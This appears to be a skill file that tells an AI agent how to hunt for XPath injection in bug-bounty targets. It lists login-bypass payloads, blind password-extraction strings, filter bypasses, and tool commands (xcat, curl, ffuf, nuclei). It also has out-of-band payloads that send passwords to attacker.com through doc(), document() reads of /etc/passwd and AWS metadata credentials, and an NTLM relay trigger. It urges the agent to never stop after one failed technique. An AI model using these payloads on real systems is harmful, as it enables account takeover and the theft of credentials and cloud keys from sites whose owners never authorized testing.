---
name: hunt-xpath
description: "Use this skill when the target uses XML-based authentication or data storage; when fingerprint shows .NET / Java apps with XML config; when login or search backed by XPath queries against XML documents; when errors mention XPathException, NodeSet, or XmlNode; when parameters flow into XML query context. Load automatically for legacy enterprise apps, SOAP services with XML auth, or apps with .xml data files served via API. Only invoke if real impact potential — auth bypass, full XML extraction, or chain to SSRF/XXE. Skip theoretical findings."
type: hunt
---

# Hunt: XPath Injection

## Crown Jewel Targets
- **Auth bypass via XPath** — `' or '1'='1` on XML-backed login (Critical)
- **Full XML document extraction** via blind XPath substring (High)
- **XPath 2.0 SSRF via doc()** — `doc('http://attacker.com')` exfils data out-of-band (Critical)
- **XPath → XXE chain** — `document()` loads external entity, escalates to file read / SSRF
- **Credentials in XML file** — config.xml, users.xml extracted via blind XPath

## Detection Signals
- Errors: `XPathException`, `XPathExpressionException`, `System.Xml.XPath`, `javax.xml.xpath`, `XPathEvalException`, `XML parsing error`, `XMLDocument`, `Invalid expression`
- Tech: Java JAXP, .NET XmlDocument, PHP SimpleXML/DOMXPath, Python lxml
- Endpoints: `/services/*.asmx`, `/soap`, `/xml`, `/auth/xml`, `/search?q=`, legacy `.aspx` with XML data
- Behavior: input `'` triggers 500 error, `' or '1'='1` changes auth response

## Attack Techniques
1. **Classic auth bypass** — `' or '1'='1` collapses `/users/user[name='$u' and pass='$p']` to always-true.
2. **Comment trick (XPath 2.0)** — `admin'(:` truncates with XPath comment.
3. **Boolean blind extraction** — `'or substring(//user[1]/password,1,1)='a` — true if first char of first password is 'a'.
4. **Length extraction** — `'or string-length(//user[1]/password)=32 or '1'='2` — true if length matches.
5. **Count nodes** — `'or count(//user)=42 or '1'='2` — leak number of records.
6. **Name extraction** — `'or name(//*[1])='users' or '1'='2` — extract XML schema.
7. **XPath 2.0 doc() function** — `'or doc('http://attacker.com/?x='+//password)='x` — out-of-band exfil (only XPath 2.0+).
8. **document() for SSRF/XXE** — `document('file:///etc/passwd')`, `document('http://169.254.169.254/')`.
9. **Union operator** — `' or position()=1 or '1'='2` to walk node-sets.
10. **String-based union** — `' | //user/password | '` to merge result sets.
11. **Avoid quote escapes** — use `concat('ad','min')` when quotes filtered.
12. **XPath injection in WHERE-like queries** — `?id=1' or '1'='1` against XmlDataSource.

## Payloads
**Auth bypass:**
```
admin' or '1'='1
admin' or 1=1 or 'a'='a
admin'or'1'='1
admin']|//*|//*['a'='a
' or ''='
' or '1'='1' or ''='
")] | //user/* | //user[("
admin' or position()=1 or '1'='2
```

**Blind boolean extraction:**
```
' or substring(//user[1]/username,1,1)='a' or '1'='2
' or substring(//user[1]/password,1,1)='a' or '1'='2
' or substring(name(//*[1]),1,1)='u' or '1'='2
' or string-length(//user[1]/password)=32 or '1'='2
' or count(//user)>5 or '1'='2
```

**XPath 2.0 — out-of-band:**
```
' or doc(concat('http://attacker.com/x?d=',//user[1]/password))='x
' or doc-available(concat('http://attacker.com/',//password))='x
```

**SSRF / file read via document():**
```
' or document('file:///etc/passwd') or '1'='2
' or document('http://169.254.169.254/latest/meta-data/') or '1'='2
' or document('http://attacker.com/exfil?d='+//password)
```

**Schema enumeration:**
```
' or name(//*[1])='something' or '1'='2
' or local-name(//*[1])='users' or '1'='2
' or namespace-uri(//*[1])='http://x' or '1'='2
```

**Bypass quote filters with concat():**
```
admin' or 1=1 or concat('a','')='a
or 1=1 or substring(.,1,1)=string-to-codepoints('a')
```

## Bypass Methods
| Filter | Bypass |
|--------|--------|
| Strips `'` | Use `concat(char(39),'a')`, `string-to-codepoints(.)`, or numeric: `or 1=1` |
| Strips `or` | Case: `OR`, `oR`, or use `|` union operator |
| Whitespace stripped | XPath ignores whitespace inside expressions |
| Length limit | Minimal: `' or 1=1 or '1'='2` |
| Encoded input | URL-encode the entire payload — XML parser decodes |
| WAF blocks SQL keywords | XPath functions: `substring`, `string-length`, `count` — not SQL signatures |
| XPath 1.0 only (no doc()) | Pivot to pure blind boolean |
| Numeric context | `1 or 1=1`, `1] | //user[1` |

## Tools
```bash
# XCAT — blind XPath extraction
xcat run -m POST -d "user=&pass=test" --true-string "Welcome" \
  http://target.com/login user

# Burp Intruder with XPath payload list (PayloadsAllTheThings/XPath Injection)

# Manual probe
curl -X POST 'https://target.com/login' \
  -d "username=admin' or '1'='1&password=x"

# Detect XPath errors via fuzzing
ffuf -u 'https://target.com/search?q=FUZZ' \
  -w xpath-payloads.txt -mr 'XPathException|XmlNodeReader'

# nuclei XPath template
nuclei -t vulnerabilities/generic/xpath-injection.yaml -u https://target.com
```

## Impact
- **Critical**: Auth bypass on login, full XML credentials extraction, XPath 2.0 doc() SSRF to metadata service, document() → file read / RCE chain
- **High**: Blind extraction of users/passwords, schema disclosure leading to further attack
- **Medium**: Information disclosure of XML structure, node count

## Chain Potential
- **+ XXE** = `document()` and `doc()` load external entities — chain to file read / SSRF / DoS
- **+ SSRF** = `doc('http://internal-service/')` reaches internal HTTP services
- **+ AWS metadata** = `doc('http://169.254.169.254/latest/meta-data/iam/security-credentials/')` → AWS keys
- **+ Auth bypass** = direct ATO on login flow
- **+ IDOR** = XPath injection enables reading arbitrary `//user[id=$x]` records
- **+ NTLM relay (Windows)** = `document('\\\\attacker\\share')` triggers SMB auth
- **+ Blind oracle → mass extraction** = scriptable char-by-char dump of full XML store

## Fallback Chain
1. If `' or '1'='1` blocked, try `"`-quote variant, `or 1=1`, or union `]|//*|//*['1'='1`.
2. If quotes stripped entirely, use `concat()`, numeric context, or comment-truncation (`(:` for XPath 2.0).
3. If blind boolean extraction is too slow, attempt XPath 2.0 `doc()` for out-of-band exfil via attacker-controlled DNS/HTTP.
4. Pivot to `document()` for SSRF / XXE chain (file read, metadata service, NTLM relay) — even if injection is blind, OOB can be high-impact. Never stop because one technique failed.

## Real-World Reports (from Community Writeups)

Very limited public reports — XPath Injection is one of the rarest disclosed bug classes on HackerOne. The only public data is detection-query work, not exploit reports.

| Title | Program | Bounty | Source |
|---|---|---|---|
| Go/CWE-643: XPath Injection Query in Go | GitHub Security Lab | $1,800 | H1 #852316 |
| XPath Injection query in Java | GitHub Security Lab | $0 | H1 #824925 |

Because public exploit writeups are essentially absent, the technique pool is taken from PortSwigger Academy, OWASP testing guide, and analogous SQLi/LDAPi structural patterns. Treat any XPath sink as **assume-vulnerable until proven safe** — there is no body of disclosed reports to dedupe against.

**Patterns to focus on** (extrapolated from the few writeups + analogous SQLi reports):
- **XML-backed legacy auth on enterprise apps** — old Java/.NET portals storing users in `users.xml` and authenticating with `//user[username='X' and password='Y']`.
- **XML config / catalog files queried with user input** — product search, document indexers, SOAP services backed by XML stores.
- **XPath 2.0 `doc()` / `document()` SSRF/file-read** — if the target uses XPath 2.0 (Saxon, MSXML6), any injection becomes an SSRF + arbitrary file-read primitive even if the boolean leak is denied.

## High-Value Chains (from Reports)

Because confirmed public XPath chains are scarce, document the analogous attack patterns to pursue:

- **XPath auth bypass → admin login → privilege escalation** — classic `' or '1'='1` against XML-stored user table; if it lands on an admin record, immediate full-privilege session. (PortSwigger Academy lab; pattern referenced in older `~/.claude/skills/hunt-xpath` test cases.)
- **Blind XPath boolean extraction → password / credential exfil** — `substring(//user[1]/password,1,1)='a'` style; viable wherever a SOAP/XML auth backend reflects success/failure differently.
- **XPath 2.0 `doc()` → SSRF → cloud metadata** — `doc(concat('http://169.254.169.254/latest/meta-data/iam/security-credentials/', //x))` reads IMDS via XML processor. Pure speculation in public reports, but matches the same primitive as XXE-IMDS chains routinely paid out (Zivver #897244, Uber #448598).
- **XPath injection → XXE pivot (when parser allows both)** — `document('http://attacker/evil.xml')` returning a malicious XML doc bridges into traditional XXE exfil.
- **CodeQL-detected XPath sinks in Java/Go libraries** — GitHub Security Lab (H1 #852316 $1,800, #824925) — the same library sinks appear in shipped corporate Java apps; reverse the queries to find real targets.
